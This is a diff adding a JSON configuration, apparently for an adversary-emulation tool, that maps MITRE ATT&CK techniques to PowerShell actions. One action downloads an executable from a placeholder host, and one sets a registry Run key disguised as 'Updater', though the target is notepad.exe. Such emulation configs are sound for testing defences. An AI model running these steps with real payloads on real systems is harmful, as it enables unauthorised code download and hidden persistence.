@@ -1,0 +1,29 @@
+﻿{
+  "delay": 3,
+  "techniques": [
+    {
+      "id": "T1059",
+      "name": "Command Shell",
+      "action": "powershell -Command \"Get-Process\""
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "action": "Invoke-WebRequest -Uri http://example.com -OutFile C:\\temp\\tool.exe"
+    },
+    {
+      "id": "T1046",
+      "name": "Network Discovery",
+      "action": "Test-NetConnection google.com -Port 80"
+    },
+    {
+      "id": "T1547",
+      "name": "Persistence Registry Run Key",
+      "registry": {
+        "path": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "name": "Updater",
+        "value": "C:\\Windows\\System32\\notepad.exe"
+      }
+    }
+  ]
+}
